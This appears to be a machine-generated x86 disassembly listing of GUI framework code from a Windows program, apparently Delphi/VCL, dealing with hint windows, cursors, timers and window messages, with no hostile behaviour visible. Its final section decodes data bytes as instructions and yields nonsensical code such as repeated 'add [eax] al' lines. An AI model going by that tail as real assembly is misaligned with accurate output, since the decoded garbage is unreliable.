cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_443dfc
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_443f64
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_45dd30
test al al
je r-xdata
call sub_443c60
mov ebp eax
mov eax edi
call sub_443c60
mov ebp eax
mov eax esi
call sub_45dd30
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_45d7f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45d84c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_45dd30
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45e57c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d853
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_45d85c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45d8b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_45dd30
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45e57c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d8bb
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_45d8cc
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403124
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_43d624
jmp r-xdata
sub_45d91c
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_45aec8
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_443c60
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45aeb4
mov ebx eax
mov eax ebx
call sub_443f64
test al al
je r-xdata
mov eax ebx
call sub_443c60
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_45d980
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43bd30
mov edi eax
call sub_43a62c
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_43e62c
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_43e62c
sub_45d9f8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45db08
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45d980
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_45ba30
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_43a594
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_45dbb8
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_45daaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_45df50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45d91c
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_41a374
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45db0f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f1c
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_45db18
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_45aeac
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45ae98
movzx edx di
xor ecx ecx
call sub_43e62c
inc esi
dec ebx
jne r-xdata
sub_45db54
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_45cc70
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45cc70
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_45db18
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_45dbb8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_404304
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403f4c
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4371bc
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_449e90
xor eax eax
push ebp
push sub_45dc3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403320
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403124
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_45dc4c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_45dca8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_45aeac
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_45dc4c
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45ae98
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_45dc4c
pop ecx
jmp r-xdata
mov eax ebx
call sub_443f64
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_443c60
push eax
call IsChild
test eax eax
jne r-xdata
sub_45dd30
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405598
call sub_42630c
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_45dd58
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_45dd9c
push sub_45ba88
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_45df50
sub_45ddc4
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406948
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43cf9c
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_43bd30
call sub_45ba68
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_45df50
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406948
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43cf9c
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_45df50
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_45dd58
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_43e62c
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_45e1e8
jmp r-xdata
sub_45ded4
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45dd9c
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_45e1e8
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_45df0c
jmp r-xdata
sub_45df0c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_443f64
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_443c60
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_443c60
push eax
call ShowWindow
sub_45df50
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_45df0c
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_45bbf0
mov eax ebx
call sub_45dd9c
sub_45df88
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_45e0ca
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_420034
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407ac0
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_45e09b
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_4200ec
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e0a2
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_402704
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_45df78
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_45df78
mov [ ebp - 0x4 ] eax
sub_45e0a2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_45e0dc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403124
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_40306c
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45e13c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_45e1d6
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e1dd
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403fe8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41ebf4
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c24c
mov ebx eax
inc ebx
sub_45e1e8
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404864
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_45e56e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45df50
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_45dd58
jmp r-xdata
call sub_454420
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e575
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403f1c
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404934
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_43bd30
call sub_45ba68
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_45df88
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_45ae2c
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43ce24
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43cfc8
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_45ba30
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_43a550
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_403f90
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_43e62c
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_45e0dc
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403320
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43cf9c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43cf9c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_43d624
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_45bb7c
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_45e13c
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_45dd58
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_45dd58
jmp r-xdata
sub_45e57c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403f4c
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403f4c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45e5dc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov [ ebx + 0xb0 ] esi
pop esi
pop ebx
retn
push esi
push 0x0
push 0xb031
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
sub_45e608
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_43e62c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_43e62c
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_449d58
sub_45e698
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_45e6c0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_45e764
add [ eax ] eax
add [ eax ] al
xor al 0x8d
inc edi
add [ ebx + ebx * 4 + 0x43 ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45e7c7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e7ce
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_4541cc
mov eax sub_45444c
call sub_413c3c
mov eax [ rw-data ]
push eax
call CloseHandle
sub_45e85f
add [ eax * 2 + 0x78456449 ] cl
arpl [ ebp + 0x70 ] sp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
lea eax [ eax ]
mov esp 0x45e8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 8 + 0xc0045 ] bh
add [ eax ] al
adc al 0xe8
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
